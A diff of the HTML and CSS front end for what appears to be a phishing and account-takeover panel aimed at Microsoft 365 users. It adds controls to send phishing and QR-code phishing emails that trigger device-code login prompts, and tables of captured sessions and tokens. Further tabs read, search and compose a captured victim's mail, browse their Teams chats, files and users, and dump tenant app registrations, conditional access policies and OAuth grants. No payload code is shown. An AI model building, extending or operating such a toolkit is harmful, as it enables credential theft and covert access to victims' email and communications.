@@ -34,15 +34,6 @@
     overflow-x: hidden;
   }
 
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,212,255,0.015) 2px, rgba(0,212,255,0.015) 4px);
-    pointer-events: none;
-    z-index: 9999;
-  }
-
   .header {
     background: var(--bg2);
     border-bottom: 1px solid var(--border);
@@ -80,6 +71,30 @@
     align-items: center;
     gap: 12px;
   }
+
+  nav {
+    background: var(--bg2);
+    border-bottom: 2px solid var(--border);
+    padding: 0 24px;
+    display: flex;
+    gap: 0;
+    overflow-x: auto;
+  }
+
+  nav a {
+    padding: 10px 18px;
+    font-size: 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    text-decoration: none;
+    white-space: nowrap;
+    border-bottom: 2px solid transparent;
+    transition: color 0.15s;
+  }
+
+  nav a:hover { color: var(--text); }
+  nav a.active { color: var(--accent); border-bottom-color: var(--accent); }
 
   .status-dot {
     width: 8px;
@@ -166,6 +181,12 @@
     border-radius: 2px;
     outline: none;
     transition: border-color 0.15s;
+  }
+  .input-group select {
+    appearance: none; -webkit-appearance: none;
+    padding-right: 28px;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%235a6a7a'/%3E%3C/svg%3E");
+    background-repeat: no-repeat; background-position: right 10px center; cursor: pointer;
   }
   .input-group input:focus, .input-group textarea:focus, .input-group select:focus { border-color: var(--accent); }
   .input-group textarea { resize: vertical; min-height: 80px; }
@@ -507,60 +528,6 @@
     border-bottom: 1px solid var(--border);
   }
 
-  .item-list { margin-bottom: 16px; }
-
-  .item-row {
-    display: flex;
-    align-items: center;
-    padding: 8px 10px;
-    border: 1px solid var(--border);
-    border-radius: 2px;
-    margin-bottom: 6px;
-    cursor: pointer;
-    transition: border-color 0.15s;
-  }
-
-  .item-row:hover { border-color: var(--accent); }
-  .item-row.selected { border-color: var(--accent); background: rgba(0,212,255,0.05); }
-
-  .item-row-name { flex: 1; font-size: 12px; color: var(--text-bright); }
-  .item-row-sub { font-size: 10px; color: var(--text-dim); }
-  .item-row-actions { display: flex; gap: 6px; }
-
-  .template-editor {
-    background: var(--bg3);
-    border: 1px solid var(--border);
-    border-radius: 2px;
-    overflow: hidden;
-  }
-
-  .editor-toolbar {
-    padding: 8px 12px;
-    background: var(--bg2);
-    border-bottom: 1px solid var(--border);
-    display: flex;
-    align-items: center;
-    gap: 8px;
-  }
-
-  .editor-toolbar span {
-    font-size: 10px;
-    color: var(--text-dim);
-    letter-spacing: 0.1em;
-  }
-
-  .editor-toolbar .var-chip {
-    padding: 2px 8px;
-    background: rgba(0,212,255,0.1);
-    border: 1px solid rgba(0,212,255,0.3);
-    border-radius: 2px;
-    font-size: 10px;
-    color: var(--accent);
-    cursor: pointer;
-    font-family: var(--mono);
-  }
-
-  .editor-toolbar .var-chip:hover { background: rgba(0,212,255,0.2); }
 
   textarea.code-editor {
     width: 100%;
@@ -588,6 +555,239 @@
     border-top: 1px solid var(--border);
     margin: 20px 0;
   }
+
+  /* ── Mail interface ── */
+  .mail-layout {
+    display: grid; grid-template-columns: 200px 340px 1fr; gap: 0;
+    height: calc(100vh - 260px); border: 1px solid var(--border);
+    border-radius: 2px; overflow: hidden;
+  }
+  .mail-folders {
+    background: var(--bg2); border-right: 1px solid var(--border);
+    overflow-y: auto; padding: 8px 0;
+  }
+  .mail-folder-item {
+    padding: 8px 14px; font-size: 11px; cursor: pointer; display: flex;
+    justify-content: space-between; align-items: center;
+    transition: background 0.1s;
+  }
+  .mail-folder-item:hover { background: rgba(0,212,255,0.06); }
+  .mail-folder-item.active { background: rgba(0,212,255,0.1); color: var(--accent); }
+  .mail-folder-badge {
+    font-size: 10px; background: rgba(0,212,255,0.15); color: var(--accent);
+    border-radius: 10px; padding: 1px 6px; min-width: 20px; text-align: center;
+  }
+  .mail-messages {
+    border-right: 1px solid var(--border); overflow-y: auto; display: flex; flex-direction: column;
+  }
+  .mail-message-item {
+    padding: 10px 14px; border-bottom: 1px solid rgba(30,39,51,0.6);
+    cursor: pointer; transition: background 0.1s;
+  }
+  .mail-message-item:hover { background: rgba(0,212,255,0.04); }
+  .mail-message-item.active { background: rgba(0,212,255,0.08); border-left: 2px solid var(--accent); }
+  .mail-message-item.unread .msg-subject { color: var(--text-bright); font-weight: 600; }
+  .msg-from { font-size: 11px; color: var(--accent); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .msg-subject { font-size: 11px; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin: 2px 0; }
+  .msg-preview { font-size: 10px; color: var(--text-dim); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .msg-date { font-size: 10px; color: var(--text-dim); white-space: nowrap; }
+  .mail-viewer {
+    background: var(--bg); display: flex; flex-direction: column; overflow: hidden;
+  }
+  .mail-viewer-header {
+    padding: 12px 16px; border-bottom: 1px solid var(--border);
+    background: var(--bg2); flex-shrink: 0;
+  }
+  .mail-viewer-actions {
+    display: flex; gap: 6px; margin-top: 8px; flex-wrap: wrap;
+  }
+  .mail-viewer-body {
+    flex: 1; overflow: hidden; position: relative;
+  }
+  #mailBodyFrame { width: 100%; height: 100%; border: none; background: #fff; }
+
+  /* ── Teams interface ── */
+  .teams-layout {
+    display: grid; grid-template-columns: 260px 1fr; gap: 0;
+    height: calc(100vh - 260px); border: 1px solid var(--border);
+    border-radius: 2px; overflow: hidden;
+  }
+  .teams-list-panel {
+    background: var(--bg2); border-right: 1px solid var(--border);
+    overflow-y: auto; display: flex; flex-direction: column;
+  }
+  .teams-list-tabs {
+    display: flex; border-bottom: 1px solid var(--border); flex-shrink: 0;
+  }
+  .teams-list-tab {
+    flex: 1; padding: 8px; font-size: 10px; text-align: center;
+    letter-spacing: 0.1em; text-transform: uppercase; cursor: pointer;
+    color: var(--text-dim); border: none; background: none;
+    font-family: var(--mono); border-bottom: 2px solid transparent; transition: all 0.15s;
+  }
+  .teams-list-tab:hover { color: var(--text); }
+  .teams-list-tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+  .teams-item {
+    padding: 10px 14px; border-bottom: 1px solid rgba(30,39,51,0.5);
+    cursor: pointer; transition: background 0.1s;
+  }
+  .teams-item:hover { background: rgba(0,212,255,0.05); }
+  .teams-item.active { background: rgba(0,212,255,0.1); border-left: 2px solid var(--accent); }
+  .teams-item-name { font-size: 11px; color: var(--text-bright); }
+  .teams-item-sub { font-size: 10px; color: var(--text-dim); margin-top: 2px; }
+  .teams-messages-panel {
+    display: flex; flex-direction: column; overflow: hidden; background: var(--bg);
+  }
+  .teams-msg-header {
+    padding: 10px 14px; border-bottom: 1px solid var(--border);
+    background: var(--bg2); flex-shrink: 0; font-size: 11px; color: var(--accent);
+    display: flex; justify-content: space-between; align-items: center;
+  }
+  .teams-msg-list {
+    flex: 1; overflow-y: auto; padding: 12px; display: flex; flex-direction: column; gap: 8px;
+  }
+  .chat-bubble {
+    max-width: 70%; padding: 8px 12px; border-radius: 4px; font-size: 11px; line-height: 1.5;
+  }
+  .chat-bubble.incoming {
+    background: var(--bg3); border: 1px solid var(--border); align-self: flex-start;
+  }
+  .chat-bubble.outgoing {
+    background: rgba(0,212,255,0.1); border: 1px solid rgba(0,212,255,0.25); align-self: flex-end;
+  }
+  .chat-sender { font-size: 10px; color: var(--accent); margin-bottom: 3px; font-weight: 600; }
+  .chat-time { font-size: 10px; color: var(--text-dim); margin-top: 3px; }
+  .teams-send-area {
+    padding: 10px 12px; border-top: 1px solid var(--border); background: var(--bg2);
+    flex-shrink: 0; display: flex; gap: 8px; align-items: flex-end;
+  }
+  .teams-send-area textarea {
+    flex: 1; background: var(--bg3); border: 1px solid var(--border);
+    color: var(--text); font-family: var(--mono); font-size: 12px;
+    padding: 7px 10px; border-radius: 2px; outline: none; resize: none;
+    min-height: 36px; max-height: 100px; transition: border-color 0.15s;
+  }
+  .teams-send-area textarea:focus { border-color: var(--accent); }
+
+  /* ── Users / Groups ── */
+  .users-layout {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 16px;
+  }
+  .filter-bar {
+    display: flex; flex-direction: column; gap: 8px; margin-bottom: 12px;
+  }
+  .filter-bar-row { display: flex; gap: 8px; align-items: center; }
+  .search-wrap {
+    flex: 1; position: relative; display: flex; align-items: center;
+  }
+  .search-wrap input {
+    width: 100%; background: var(--bg3); border: 1px solid var(--border);
+    color: var(--text); font-family: var(--mono); font-size: 12px;
+    padding: 6px 10px 6px 30px; border-radius: 2px; outline: none;
+    transition: border-color 0.15s;
+  }
+  .search-wrap input:focus { border-color: var(--accent); }
+  .search-wrap input::placeholder { color: var(--text-dim); }
+  .search-wrap::before {
+    content: '⌕'; position: absolute; left: 9px;
+    color: var(--text-dim); font-size: 14px; pointer-events: none; line-height:1;
+  }
+  .filter-chips { display: flex; gap: 5px; align-items: center; flex-wrap: wrap; }
+  .filter-chip-label {
+    font-size: 9px; letter-spacing: 0.2em; text-transform: uppercase;
+    color: var(--text-dim); white-space: nowrap; margin-right: 2px;
+  }
+  .filter-chip {
+    padding: 2px 8px; font-size: 10px; font-family: var(--mono);
+    background: transparent; border: 1px solid var(--border);
+    color: var(--text-dim); border-radius: 2px; cursor: pointer;
+    transition: all 0.12s; letter-spacing: 0.05em;
+  }
+  .filter-chip:hover { border-color: var(--accent); color: var(--text); }
+  .filter-chip.active {
+    background: rgba(0,212,255,0.1); border-color: var(--accent);
+    color: var(--accent);
+  }
+  .detail-panel {
+    margin-top: 16px; background: var(--bg2); border: 1px solid var(--border);
+    border-radius: 2px; overflow: hidden;
+  }
+  .detail-panel-header {
+    padding: 10px 14px; border-bottom: 1px solid var(--border);
+    display: flex; justify-content: space-between; align-items: center;
+  }
+  .detail-panel-title { font-size: 11px; color: var(--accent); font-weight: 600; }
+  .detail-tabs { display: flex; border-bottom: 1px solid var(--border); }
+  .detail-tab {
+    padding: 7px 14px; font-size: 10px; letter-spacing: 0.1em; text-transform: uppercase;
+    color: var(--text-dim); cursor: pointer; border-bottom: 2px solid transparent;
+    border: none; background: none; font-family: var(--mono); transition: all 0.15s;
+  }
+  .detail-tab:hover { color: var(--text); }
+  .detail-tab.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
+  .detail-body { padding: 14px; max-height: 400px; overflow-y: auto; }
+  .kv-grid {
+    display: grid; grid-template-columns: 160px 1fr; gap: 0;
+    border: 1px solid var(--border); border-radius: 2px; overflow: hidden;
+  }
+  .kv-key { padding: 6px 10px; background: var(--bg3); color: var(--text-dim); font-size: 10px; border-bottom: 1px solid var(--border); }
+  .kv-val { padding: 6px 10px; background: var(--bg2); color: var(--text-bright); font-size: 11px; border-bottom: 1px solid var(--border); word-break: break-all; }
+
+  /* ── Files tab ── */
+  .files-toolbar {
+    display: flex; gap: 8px; align-items: center; margin-bottom: 14px; flex-wrap: wrap;
+  }
+  .files-toolbar input { flex: 1; min-width: 120px; }
+
+  /* ── Pagination ── */
+  .pager {
+    display: flex; gap: 8px; align-items: center; padding: 10px 0;
+    font-size: 11px; color: var(--text-dim);
+  }
+  .pager-info { flex: 1; }
+
+  /* ── Modal overlay ── */
+  .modal-overlay {
+    position: fixed; inset: 0; background: rgba(0,0,0,0.7);
+    z-index: 500; display: flex; align-items: center; justify-content: center;
+  }
+  .modal-box {
+    background: var(--bg2); border: 1px solid var(--border); border-radius: 4px;
+    width: 560px; max-height: 80vh; overflow: auto;
+  }
+  .modal-header {
+    padding: 12px 16px; border-bottom: 1px solid var(--border);
+    display: flex; justify-content: space-between; align-items: center;
+  }
+  .modal-header-title { font-size: 11px; letter-spacing: 0.15em; text-transform: uppercase; color: var(--accent); }
+  .modal-body { padding: 16px; }
+  .modal-close { background: none; border: none; color: var(--text-dim); cursor: pointer; font-size: 16px; }
+
+  /* target selector bar for new tabs */
+  .tab-target-bar {
+    display: flex; gap: 8px; align-items: center; margin-bottom: 14px;
+    padding: 8px 10px; background: var(--bg2); border: 1px solid var(--border);
+    border-radius: 2px;
+  }
+  .tab-target-bar label { font-size: 9px; font-weight:600; color: var(--text-dim); white-space: nowrap; letter-spacing: 0.2em; text-transform:uppercase; }
+  .tab-target-bar input[type="text"] {
+    background: var(--bg3); border: 1px solid var(--border); color: var(--text);
+    font-family: var(--mono); font-size: 12px; padding: 6px 10px; border-radius: 2px;
+    outline: none; transition: border-color 0.15s; flex: 1; min-width: 120px;
+  }
+  .tab-target-bar input[type="text"]:focus { border-color: var(--accent); }
+  .tab-target-bar input[type="text"]::placeholder { color: var(--text-dim); }
+  .tab-target-bar select {
+    flex: 1; min-width: 180px;
+    background: var(--bg3); border: 1px solid var(--border); color: var(--text);
+    font-family: var(--mono); font-size: 12px; padding: 6px 28px 6px 10px;
+    border-radius: 2px; outline: none; appearance: none; -webkit-appearance: none;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%235a6a7a'/%3E%3C/svg%3E");
+    background-repeat: no-repeat; background-position: right 10px center;
+    cursor: pointer; transition: border-color 0.15s;
+  }
+  .tab-target-bar select:focus { border-color: var(--accent); }
+  .tab-target-bar select option { background: var(--bg3); }
 </style>
 </head>
 <body>
@@ -599,8 +799,14 @@
   <div class="header-right">
     <div class="status-dot" id="connectionDot"></div>
     <span id="connectionStatus" style="font-size:10px;color:var(--text-dim)">CONNECTED</span>
+    <button class="btn btn-sm btn-danger" onclick="doLogout()" style="margin-bottom:0">⎋ Logout</button>
   </div>
 </div>
+<nav>
+  <a href="/" class="active">Operations</a>
+  <a href="/tools">Advanced Tools</a>
+  <a href="/infra">Infrastructure</a>
+</nav>
 
 <div class="layout">
   <!-- Sidebar -->
@@ -652,21 +858,38 @@
           <option value="">— no template —</option>
         </select>
       </div>
-      <button class="btn btn-warn" onclick="sendPhishingEmails()">✉ Send Phishing Emails</button>
-      <button class="btn" onclick="showMailConfig()">⚙ Configure Mail</button>
+      <button class="btn btn-warn" onclick="sendPhishingEmails()">✉ Send All Phishing Emails</button>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-label">QR Phishing</div>
+      <div class="input-group">
+        <label>QR Email Template <span style="color:var(--text-dim)">(use {{QRC}})</span></label>
+        <select id="qrTemplate">
+          <option value="">— no template —</option>
+        </select>
+      </div>
+      <div class="input-group">
+        <label>DC Email Template <span style="color:var(--text-dim)">(sent on scan)</span></label>
+        <select id="qrDcTemplate">
+          <option value="">— no template —</option>
+        </select>
+      </div>
+      <div class="input-group">
+        <label>Public Base URL</label>
+        <input id="qrBaseUrl" type="text" placeholder="https://your-server.com">
+      </div>
+      <button class="btn btn-warn" onclick="sendQREmails()">⬛ Send QR Emails</button>
+      <button class="btn btn-sm" onclick="switchTab('qrscans', document.querySelector('.tab[data-tab=qrscans]'))" style="width:100%;margin-top:4px">👁 View QR Scan Status</button>
     </div>
 
     <div class="sidebar-section">
       <div class="sidebar-label">Campaign Actions</div>
       <button class="btn btn-success" onclick="launchCampaign()">▶ Launch Campaign</button>
+      <button class="btn btn-warn btn-sm" onclick="regenAll()" style="width:100%;margin-bottom:8px">↻ Regen All Codes</button>
       <button class="btn btn-danger" onclick="stopCampaign()">■ Stop Campaign</button>
       <button class="btn btn-primary" onclick="exportCampaign()">↓ Export Campaign</button>
       <button class="btn btn-danger" onclick="confirmDeleteCampaign()">🗑 Delete Campaign</button>
-    </div>
-
-    <div class="sidebar-section">
-      <div class="sidebar-label">Telemetry</div>
-      <button class="btn" onclick="showWebhookView()">📡 Webhook Listener</button>
     </div>
 
   </div>
@@ -707,10 +930,15 @@
 
       <div class="tabs">
         <button class="tab active" onclick="switchTab('sessions', this)">Sessions</button>
-        <button class="tab" onclick="switchTab('tokens', this)">Captured Tokens</button>
+        <button class="tab" onclick="switchTab('tokens', this)">Tokens</button>
+        <button class="tab" onclick="switchTab('mail', this)">Mail</button>
+        <button class="tab" onclick="switchTab('qrscans', this)" data-tab="qrscans">QR Scans</button>
+        <button class="tab" onclick="switchTab('teams', this)">Teams</button>
+        <button class="tab" onclick="switchTab('files', this)">Files</button>
+        <button class="tab" onclick="switchTab('users', this)">Users</button>
         <button class="tab" onclick="switchTab('graph', this)">Graph Ops</button>
         <button class="tab" onclick="switchTab('targets', this)">Targets</button>
-        <button class="tab" onclick="switchTab('emails', this)">Emails Sent</button>
+        <button class="tab" onclick="switchTab('emails', this)">Emails</button>
       </div>
 
       <!-- Sessions tab -->
@@ -726,13 +954,15 @@
                 <th>Poll Count</th>
                 <th>Expires</th>
                 <th>UPN (resolved)</th>
+                <th></th>
               </tr>
             </thead>
             <tbody id="sessionsBody">
-              <tr><td colspan="6" style="text-align:center;padding:32px;color:var(--text-dim)">No active sessions</td></tr>
+              <tr><td colspan="7" style="text-align:center;padding:32px;color:var(--text-dim)">No active sessions</td></tr>
             </tbody>
           </table>
         </div>
+        <div id="sessionsPager" class="pager"></div>
       </div>
 
       <!-- Tokens tab -->
@@ -754,6 +984,7 @@
             </tbody>
           </table>
         </div>
+        <div id="tokensPager" class="pager"></div>
         <div class="capture-log" style="margin-top:16px">
           <div class="capture-log-header">
             <span style="width:8px;height:8px;border-radius:50%;background:var(--accent3);display:inline-block;animation:pulse 1s infinite"></span>
@@ -768,62 +999,81 @@
       <!-- Graph Ops tab -->
       <div id="tab-graph" class="tab-content">
         <div class="section-header">Graph API Operations</div>
+
+        <!-- Shared target selector -->
+        <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap">
+          <label style="font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim)">Target</label>
+          <select id="graphTargetSelect" onchange="graphTargetChanged()" style="background:var(--bg3);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:12px;padding:6px 28px 6px 10px;border-radius:2px;min-width:220px;outline:none;appearance:none;-webkit-appearance:none;background-image:url('data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'10\' height=\'6\' viewBox=\'0 0 10 6\'%3E%3Cpath d=\'M0 0l5 6 5-6z\' fill=\'%235a6a7a\'/%3E%3C/svg%3E');background-repeat:no-repeat;background-position:right 10px center;cursor:pointer">
+            <option value="">— select captured target —</option>
+          </select>
+        </div>
+
+        <!-- Enumeration + output (main layout) -->
         <div class="graph-layout">
-          <!-- Left: target selector + op buttons -->
           <div class="graph-sidebar">
             <div class="config-card">
-              <div class="config-card-title">Target</div>
-              <div class="input-group">
-                <label>Captured Session</label>
-                <select id="graphTargetSelect" onchange="graphTargetChanged()">
-                  <option value="">— select captured target —</option>
-                </select>
-              </div>
-              <div style="font-size:10px;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-dim);margin:12px 0 8px">Enumeration</div>
+              <div class="config-card-title">Enumeration</div>
               <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('me')">👤 Whoami (/me)</button>
-              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('mailboxes')">📬 Discover Mailboxes</button>
               <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('groups')">🏢 List Groups</button>
               <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('owned-groups')">✏ Owned / Modifiable Groups</button>
-              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('teams')">💬 Joined Teams</button>
-              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('chats')">💬 Teams Chats</button>
-              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('conditional-access')">🔒 Dump Conditional Access</button>
-              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('apps')">📦 Dump App Registrations</button>
-              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphOp('grants')">🔑 OAuth2 Permission Grants</button>
-
-              <div style="font-size:10px;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-dim);margin:12px 0 8px">Search</div>
+              <div style="font-size:10px;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-dim);margin:12px 0 6px">Search Users</div>
               <div class="input-group">
                 <input type="text" id="graphSearchQuery" placeholder="keyword / *">
               </div>
-              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphSearch('emails')">📧 Search Emails</button>
-              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="driveOpen('root')">📁 Browse OneDrive / SharePoint</button>
-              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphSearch('files')">🔍 Search Files</button>
-              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphSearch('users')">🔍 Search User Attributes</button>
-
-              <div style="font-size:10px;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-dim);margin:12px 0 8px">Actions</div>
-              <div class="input-group">
-                <input type="text" id="graphCloneSrc" placeholder="Source group ID">
-                <input type="text" id="graphCloneName" placeholder="New group display name" style="margin-top:4px">
-              </div>
-              <button class="btn btn-sm btn-warn" style="width:100%;margin-bottom:4px" onclick="graphCloneGroup()">🔁 Clone Security Group</button>
-              <div class="input-group" style="margin-top:8px">
-                <input type="text" id="graphAppName" placeholder="App display name">
-                <input type="text" id="graphAppRedirect" placeholder="Redirect URI (optional)" style="margin-top:4px">
-              </div>
-              <button class="btn btn-sm btn-warn" style="width:100%;margin-bottom:4px" onclick="graphDeployApp()">⚡ Deploy App Registration</button>
+              <button class="btn btn-sm" style="width:100%;margin-bottom:4px" onclick="graphSearch('users')">🔍 Search Users</button>
             </div>
           </div>
-          <!-- Right: output -->
           <div class="graph-output-panel">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:6px">
               <span style="font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim)" id="graphOpLabel">Output</span>
-              <div id="graphBtnBar" style="display:flex;gap:6px;align-items:center">
-                <button class="btn btn-sm" id="graphRawBtn" onclick="graphToggleRaw()" style="display:none">{ } Raw JSON</button>
-                <button class="btn btn-sm" id="graphDlBtn" onclick="graphDownloadResult()" style="display:none">↓ Download JSON</button>
+              <div style="display:flex;gap:6px">
+                <button class="btn btn-sm" id="graphRawBtn" onclick="graphToggleRaw()" style="display:none">{ } Raw</button>
+                <button class="btn btn-sm" id="graphDlBtn" onclick="graphDownloadResult()" style="display:none">↓ JSON</button>
               </div>
             </div>
             <div id="graphOutput">Select a target and operation...</div>
           </div>
         </div>
+
+        <!-- App Registrations section -->
+        <div class="config-card" style="margin-top:16px">
+          <div class="config-card-title" style="display:flex;justify-content:space-between;align-items:center">
+            <span>App Registrations</span>
+            <div style="display:flex;gap:6px">
+              <button class="btn btn-sm" id="graphAppsDlBtn" onclick="graphDumpDownload('apps')" style="display:none">↓ JSON</button>
+            </div>
+          </div>
+          <div style="font-size:11px;color:var(--text-dim);margin-bottom:12px">Enumerate all registered applications and service principals in the tenant.</div>
+          <button class="btn btn-sm btn-primary" onclick="graphDump('apps')" style="width:auto">▶ Dump App Registrations</button>
+          <div id="graphAppsOutput" style="margin-top:12px;background:var(--bg);border:1px solid var(--border);padding:12px;font-size:11px;color:var(--text-dim);min-height:40px;max-height:320px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;border-radius:2px;display:none"></div>
+        </div>
+
+        <!-- Conditional Access section -->
+        <div class="config-card" style="margin-top:16px">
+          <div class="config-card-title" style="display:flex;justify-content:space-between;align-items:center">
+            <span>Conditional Access Policies</span>
+            <div style="display:flex;gap:6px">
+              <button class="btn btn-sm" id="graphCaDlBtn" onclick="graphDumpDownload('conditional-access')" style="display:none">↓ JSON</button>
+            </div>
+          </div>
+          <div style="font-size:11px;color:var(--text-dim);margin-bottom:12px">Retrieve all Conditional Access policies configured in the tenant. Requires privileged role.</div>
+          <button class="btn btn-sm btn-primary" onclick="graphDump('conditional-access')" style="width:auto">▶ Dump Conditional Access</button>
+          <div id="graphCaOutput" style="margin-top:12px;background:var(--bg);border:1px solid var(--border);padding:12px;font-size:11px;color:var(--text-dim);min-height:40px;max-height:320px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;border-radius:2px;display:none"></div>
+        </div>
+
+        <!-- OAuth2 Permission Grants section -->
+        <div class="config-card" style="margin-top:16px;margin-bottom:8px">
+          <div class="config-card-title" style="display:flex;justify-content:space-between;align-items:center">
+            <span>OAuth2 Permission Grants</span>
+            <div style="display:flex;gap:6px">
+              <button class="btn btn-sm" id="graphGrantsDlBtn" onclick="graphDumpDownload('grants')" style="display:none">↓ JSON</button>
+            </div>
+          </div>
+          <div style="font-size:11px;color:var(--text-dim);margin-bottom:12px">List all delegated OAuth2 permission grants — shows which apps have been granted access on behalf of users.</div>
+          <button class="btn btn-sm btn-primary" onclick="graphDump('grants')" style="width:auto">▶ Dump OAuth2 Grants</button>
+          <div id="graphGrantsOutput" style="margin-top:12px;background:var(--bg);border:1px solid var(--border);padding:12px;font-size:11px;color:var(--text-dim);min-height:40px;max-height:320px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;border-radius:2px;display:none"></div>
+        </div>
+
       </div>
 
       <!-- Targets tab -->
@@ -838,13 +1088,15 @@
                 <th>Department</th>
                 <th>Region</th>
                 <th>Group</th>
+                <th style="text-align:right">Actions</th>
               </tr>
             </thead>
             <tbody id="targetsBody">
-              <tr><td colspan="5" style="text-align:center;padding:32px;color:var(--text-dim)">No targets imported</td></tr>
+              <tr><td colspan="6" style="text-align:center;padding:32px;color:var(--text-dim)">No targets imported</td></tr>
             </tbody>
           </table>
         </div>
+        <div id="targetsPager" class="pager"></div>
       </div>
 
       <!-- Emails tab -->
@@ -865,206 +1117,247 @@
             </tbody>
           </table>
         </div>
+        <div id="emailResultsPager" class="pager"></div>
       </div>
+
+      <!-- ── MAIL TAB ── -->
+      <div id="tab-mail" class="tab-content">
+        <div class="tab-target-bar">
+          <label>TARGET</label>
+          <select id="mailTargetSelect"><option value="">— select captured target —</option></select>
+          <button class="btn btn-sm btn-primary" onclick="loadMailFolders()">Load Mail</button>
+          <button class="btn btn-sm btn-success" onclick="mailCompose()">✉ Compose</button>
+          <button class="btn btn-sm" onclick="discoverMailboxes()" title="Discover accessible shared mailboxes">📬 Mailboxes</button>
+        </div>
+        <div class="mail-layout">
+          <!-- Folders -->
+          <div class="mail-folders" id="mailFolderPanel">
+            <div style="padding:8px 14px;font-size:9px;letter-spacing:0.2em;text-transform:uppercase;color:var(--text-dim)">Folders</div>
+            <div id="mailFolderList"><div style="padding:12px 14px;font-size:11px;color:var(--text-dim)">Load mail to see folders</div></div>
+          </div>
+          <!-- Message list -->
+          <div class="mail-messages" id="mailMessagePanel">
+            <div style="padding:4px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-shrink:0">
+              <span style="font-size:9px;letter-spacing:0.2em;text-transform:uppercase;color:var(--text-dim)">Messages</span>
+              <select id="mailOrderSelect" onchange="mailLoadMessages(0)" style="font-size:10px;background:var(--bg3);color:var(--text);border:1px solid var(--border);border-radius:3px;padding:2px 4px">
+                <option value="desc">Newest first</option>
+                <option value="asc">Oldest first</option>
+              </select>
+            </div>
+            <div style="flex:1;overflow-y:auto" id="mailMessageList"><div style="padding:20px;font-size:11px;color:var(--text-dim);text-align:center">Select a folder</div></div>
+            <div id="mailMessagePager" style="padding:4px 8px;border-top:1px solid var(--border);background:var(--bg2);flex-shrink:0"></div>
+          </div>
+          <!-- Message viewer -->
+          <div class="mail-viewer" id="mailViewerPanel">
+            <div class="mail-viewer-header" id="mailViewerHeader">
+              <div style="font-size:11px;color:var(--text-dim)">Select a message to read</div>
+              <div class="mail-viewer-actions" id="mailViewerActions"></div>
+            </div>
+            <div class="mail-viewer-body">
+              <iframe id="mailBodyFrame" sandbox="allow-same-origin" srcdoc="<html><body style='background:#f5f5f5;color:#333;font-family:sans-serif;padding:20px'><p style='color:#888'>No message selected</p></body></html>"></iframe>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── QR SCANS TAB ── -->
+      <div id="tab-qrscans" class="tab-content">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+          <span style="font-size:11px;color:var(--text-dim)">Tracks who scanned the QR code and whether the device code email was auto-sent.</span>
+          <button class="btn btn-sm btn-primary" onclick="loadQRScans()">↻ Refresh</button>
+        </div>
+        <table class="data-table">
+          <thead><tr>
+            <th>Target Email</th>
+            <th>Created</th>
+            <th>Last Scanned</th>
+            <th>Scans</th>
+            <th>DC Email</th>
+            <th>Token</th>
+          </tr></thead>
+          <tbody id="qrScansBody">
+            <tr><td colspan="6" style="text-align:center;padding:24px;color:var(--text-dim)">No QR scans yet — send QR emails first</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <!-- ── TEAMS TAB ── -->
+      <div id="tab-teams" class="tab-content">
+        <div class="tab-target-bar">
+          <label>TARGET</label>
+          <select id="teamsTargetSelect"><option value="">— select captured target —</option></select>
+          <button class="btn btn-sm btn-primary" onclick="teamsLoad('teams')">Load Teams</button>
+          <button class="btn btn-sm" onclick="teamsLoad('chats')">Load Chats</button>
+          <button class="btn btn-sm btn-success" onclick="teamsNewChat()">+ New Chat</button>
+        </div>
+        <div class="teams-layout">
+          <!-- List panel -->
+          <div class="teams-list-panel">
+            <div class="teams-list-tabs">
+              <button class="teams-list-tab active" id="teamsTabTeams" onclick="teamsLoad('teams')">Teams</button>
+              <button class="teams-list-tab" id="teamsTabChats" onclick="teamsLoad('chats')">Chats</button>
+            </div>
